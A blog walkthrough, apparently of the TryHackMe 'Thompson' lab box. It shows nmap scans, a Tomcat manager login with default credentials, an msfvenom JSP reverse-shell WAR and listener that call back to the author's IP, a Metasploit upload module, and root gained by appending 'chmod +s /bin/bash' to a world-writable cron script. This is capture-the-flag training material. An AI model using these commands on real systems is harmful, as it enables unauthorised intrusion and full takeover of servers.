---
layout: post
title: "Thompson THM"
date: 2022-08-07
categories: [THM, machine-easy]
image: /assets/img/Thompson-THM/Thompson.png
---
## Thompson Walkthrough
Starting off with nmap
```
nmap -sC -sV -v 10.10.187.143 -oN nmap.txt
```
```
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Apache Tomcat/8.5.5
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Try scanning for http script engines as it does not work on browser
```
└─$ nmap -p 8009 -script http* 10.10.187.143 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-07 20:53 EAT
Pre-scan script results:
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
Nmap scan report for 10.10.187.143
Host is up (0.22s latency).

PORT     STATE SERVICE
8009/tcp open  ajp13

Nmap done: 1 IP address (1 host up) scanned in 2.18 seconds

```

## port 22 enumeration
from banner, we google (openssh 4ubuntu2.8).
From banner of ssh after google it, we can say that it might be ubuntu 16.04 Xenial

Allow entering password -> bruteforce attack(test later)

## port 8080 enumeration

Try something few CVE  after observing but all fails

```
1. Not Vulnerable to CVE-2017-12617 
2. Fail CVE-2020-9484 as it doesnot return internal server error
```
Let go and interact with Tomcat

Let first try default password on manager http://YourIp:8080/manager/status and we successfully login with username be `tomcat` and password be `s3cret`

We can do this into 2 ways
1. Do manually uploading and execute
2. Using metasploit framework

## Do manually uploading and execute
Navigate to http://YourIp:8080/manager/html and we can see a place of uploading war file

<img src='/assets/img/Thompson-THM/waruploaded.png' alt=''>

I will use msfvenom to create war file and upload it.After uploading, i will execute it and get a shell

**Creating war file**
Command
```
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.18.18.117 lport=1234 -f war -o  shell.war
```
Output
```
Payload size: 1087 bytes
Final size of war file: 1087 bytes
Saved as: shell.war
```

**Uploading war file**

Navigate to http://YourIp:8080/manager/html and go to section of `WAR file to deploy`. You will see `Select WAR file to upload` with 2 buttons of Browse... and Deploy.Click Browser and choose your war file and click deploy

After upload it, you will see it in paths with name of that war in Applications.For mine, it was shell.war so name ot be seen ,it will be shell


<img src='/assets/img/Thompson-THM/uploadedshell.png' alt=''>

**Execute it**

Click the name of your war file after you already open netcat or msfconsole
Command
```
msfconsole -q -x 'use exploit/multi/handler;set payload java/jsp_shell_reverse_tcp;set LHOST 10.18.18.117;set LPORT 1234;run'
```
Output
```
[*] Using configured payload generic/shell_reverse_tcp
payload => java/jsp_shell_reverse_tcp
LHOST => 10.18.18.117
LPORT => 1234
[*] Started reverse TCP handler on 10.18.18.117:1234 

```
Now click shell to get shell to a box
We got shell to box
```
└─$ msfconsole -q -x 'use exploit/multi/handler;set payload java/jsp_shell_reverse_tcp;set LHOST 10.18.18.117;set LPORT 1234;run'
[*] Using configured payload generic/shell_reverse_tcp
payload => java/jsp_shell_reverse_tcp
LHOST => 10.18.18.117
LPORT => 1234
[*] Started reverse TCP handler on 10.18.18.117:1234 
[*] Command shell session 1 opened (10.18.18.117:1234 -> 10.10.187.143:38758 ) at 2022-08-07 22:15:44 +0300

id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

```
For netcat
```
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.18.18.117] from (UNKNOWN) [10.10.187.143] 38760

id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)


```

## Using metasploitable framework to get shell on tomcat after authenticate succefully
Since we know username and password, there is no need to bruteforce.
```
msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload;set RHOSTS 10.10.187.143;set RPORT 8080;set HttpUsername tomcat;set HttpPassword s3cret;set LHOST 10.18.18.117;set LPORT 1235;run'
```
But i will continue with my previous shell

## PRIVILEDGE ESCALATION
Let check for users
```
tomcat@ubuntu:/$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
jack:x:1000:1000:tom,,,:/home/jack:/bin/bash
tomcat:x:1001:1001::/opt/tomcat:/bin/bash

```
Navigate to /opt/tomcat to look for interesting stuff but nothing interesting

Checking to /home/jack, i can see that file id.sh, i have permission to read,write and excute as any user and other files like test.txt and user.txt, i have permission to read them
```
tomcat@ubuntu:/tmp$ ls -la /home/jack
ls -la /home/jack
total 48
drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .
drwxr-xr-x 3 root root 4096 Aug 14  2019 ..
-rw------- 1 root root 1476 Aug 14  2019 .bash_history
-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout
-rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc
drwx------ 2 jack jack 4096 Aug 14  2019 .cache
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano
-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile
-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root root   39 Aug  7 12:55 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts

```

Navigate to /home/jack and start reading file i understand that file id.sh somehow execute by root and redirect output to text.txt
```
tomcat@ubuntu:/tmp$ cd /home/jack
cd /home/jack
tomcat@ubuntu:/home/jack$ cat user.txt
cat user.txt
[REDACTED]
tomcat@ubuntu:/home/jack$ cat test.txt
cat test.txt
uid=0(root) gid=0(root) groups=0(root)
tomcat@ubuntu:/home/jack$ cat id.sh
cat id.sh
#!/bin/bash
id > test.txt

```
Let first check crontab to confirm that somehow there is cronjobs running
Commands
```
cat /etc/crontab
```
Output
```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	root	cd /home/jack && bash id.sh
#

```
As you can see from above, that there is cronjob being running and execute id.sh after navigate to /home/jack as root

Luckliy for me, this file id.sh, i have permission to edit
I will pass `chmod +s /bin/bash` in which it will change by setting /bin/bash setuid

```
tomcat@ubuntu:/home/jack$ echo -n "chmod +s /bin/bash" >> id.sh
echo -n "chmod +s /bin/bash" >> id.sh
tomcat@ubuntu:/home/jack$ cat id.sh
cat id.sh
#!/bin/bash
id > test.txt
chmod +s /bin/bashtomcat@ubuntu:/home/jack$ 

```
After awhile, we successful set setuid and execute` /bin/bash -p` to get shell as root

```
tomcat@ubuntu:/home/jack$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
tomcat@ubuntu:/home/jack$ /bin/bash -p 
/bin/bash -p
bash-4.3# cd /root
cd /root
bash-4.3# ls -la
ls -la
total 24
drwx------  3 root root 4096 Aug 14  2019 .
drwxr-xr-x 22 root root 4096 Aug 14  2019 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Aug 14  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Aug 14  2019 root.txt
bash-4.3# cat root.txt
cat root.txt
[REDACTED]

```
We are done.

Greet from <a href="https://twitter.com/blackninja233" target="_blank" rel="noopener">blackninja23</a> 



